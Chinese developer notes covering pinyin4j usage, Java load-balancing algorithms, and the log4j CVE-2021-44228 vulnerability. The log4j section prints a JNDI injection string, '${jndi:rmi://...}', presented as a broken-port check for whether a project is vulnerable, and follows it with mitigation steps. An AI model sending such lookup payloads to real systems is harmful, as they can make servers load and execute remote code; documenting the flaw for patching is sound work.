## 中文（简体/繁体）转拼音 ``pinyin4j``
```xml
        <!-- https://mvnrepository.com/artifact/com.belerweb/pinyin4j -->
        <dependency>
            <groupId>com.belerweb</groupId>
            <artifactId>pinyin4j</artifactId>
            <version>2.5.1</version>
        </dependency>
```

```java
public static void main(String[] args) throws BadHanyuPinyinOutputFormatCombination {
        HanyuPinyinOutputFormat format = new HanyuPinyinOutputFormat();
        // 大小写 默认小写
        format.setCaseType(HanyuPinyinCaseType.LOWERCASE);
        // 音调 默认数字
        format.setToneType(HanyuPinyinToneType.WITH_TONE_MARK);
        // 区别u和v 默认u
        format.setVCharType(HanyuPinyinVCharType.WITH_U_UNICODE);

        String s = PinyinHelper.toHanYuPinyinString("律师", format, " ", true);
        System.out.println(s);
    }
```



## 负载均衡算法 ``lbalgorithm``

1. 完全轮训

   ```java
   class RoundRobin {
       // 并发锁
       private static final Object LOCK = new Object();
   
       // 基于数组实现的链表
       private static final List<String> serverList;
       // 记录链表索引位置
       private static int index = 0;
   
       static {
           Set<String> set = IpMap.serverWeightMap.keySet();
           serverList = new ArrayList<>(set);
       }
   
       public static String getServer() {
           String server = null;
           synchronized (LOCK) {
               if (index >= serverList.size()) {
                   index = 0;
               }
               server = serverList.get(index);
               index++;
           }
           return server;
       }
   }
   ```

2. 加权轮训

   ```java
   /**
    * 加权轮询
    */
   class RoundRobinWeight {
       private static final Object lock = new Object();
   
       //
   //    private static ConcurrentSkipListMap<String, Integer> concurrentSkipListMap = new ConcurrentSkipListMap<>();
       private static final TreeMap<String, Integer> concurrentSkipListMap = new TreeMap<>();
   
       static {
           IpMap.serverWeightMap.keySet().forEach(x -> concurrentSkipListMap.put(x, 0));
       }
   
       public static String getServer() {
           String server = null;
           synchronized (lock) {
               for (Map.Entry<String, Integer> entry : concurrentSkipListMap.entrySet()) {
                   if (entry.getValue() < IpMap.serverWeightMap.get(entry.getKey())) {
                       concurrentSkipListMap.put(entry.getKey(), entry.getValue() + 1);
                       server = entry.getKey();
                       return server;
                   }
               }
               // 重置 concurrentSkipListMap
               IpMap.serverWeightMap.keySet().forEach(x -> concurrentSkipListMap.put(x, 0));
               // 返回第一个
   //                server = concurrentSkipListMap.keySet().first();
               server = concurrentSkipListMap.firstKey();
               concurrentSkipListMap.put(server, concurrentSkipListMap.get(server) + 1);
           }
   
           return server;
       }
   }
   ```

3. 完全随机

   ```java
   /**
    * 完全随机
    */
   class Random {
       public static String getServer() {
           int i = RandomUtil.randomInt(RandomAlgorithm.serverList.size());
           return RandomAlgorithm.serverList.get(i);
       }
   }
   ```

4. 加权随机

   ```java
   /**
    * 加权随机
    */
   class RandomWeight {
   
       // 私有化按权重展开的list
       private static final List<String> serverList = new ArrayList<>();
       // 对配置的ip，按照权重展开放入list中
       static {
           RandomAlgorithm.serverWeightList.forEach((x, y) -> {
               for (int i = 0; i < y; i++) {
                   serverList.add(x);
               }
           });
       }
   
       public static String getServer() {
           int i = RandomUtil.randomInt(RandomWeight.serverList.size());
           return RandomWeight.serverList.get(i);
       }
   }
   ```

5. 哈希

   ```java
   /**
    * 一致性哈希算法
    */
   class Hash {
   
       /**
        * 根据客户端IP获取服务端IP
        *
        * @param ip 客户端IP
        * @return 服务器IP
        */
       public static String getServer(String ip) {
           // 不同的字符串有可能哈希值相同
           int i = ip.hashCode();
           int index = i % HashAlgorithm.serverList.size();
           // 哈希值为负数时，余数也为负数
           index = index < 0 ? -index : index;
           return HashAlgorithm.serverList.get(index);
       }
   }
   ```

   

## ```log4j``` 漏洞 ```[CVE-2021-44228]```

### 重现

``log4j`` <=2.14.1的版本会默认开启解析EL表达式，造成注入的风险。

描述：Apache Log4j2 <=2.14.1 在配置、日志消息和参数中使用的 JNDI 功能不能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。当启用消息查找替换时，可以控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。从 log4j 2.15.0 开始，默认情况下已禁用此行为。

这个问题是由阿里云安全团队的陈兆军发现的。

[官网解释](https://logging.apache.org/log4j/2.x/security.html)

```java
public static void main(String[] args){
		// 1.EL表达式演示
  	// 获取系统版本信息
  	logger.info("${java:os}");
    // 获取当前服务器硬件信息
   	logger.info("${java:hw}");
  	// ……等等
  
  	// 2.利用EL表达式jndi注入
  	// JNDI服务可以执行远程的class对象文件（可攻击破坏任意文件，执行删除、关机等等）。
  	// 此处没有搭JNDI服务，解析时会把aa当作端口解析，报错则说明试图调用远程JNDI服务，项目有此漏洞。
  	logger.info("${jndi:rmi://192.168.0.1:aa}")
}
```

### 修复

对于 ``SpringBoot`` 项目：

```tex
1.增加配置
log4j2.formatMsgNoLookups=true
2.项目的父POM文件中的 properties 添加参数
<log4j2.version>2.15.0</log4j2.version>
3.打开idea自带的依赖图，找出所有依赖log4j-api和log4j-core的包，exclusion掉这两个依赖。（推荐插件maven helper）。
```

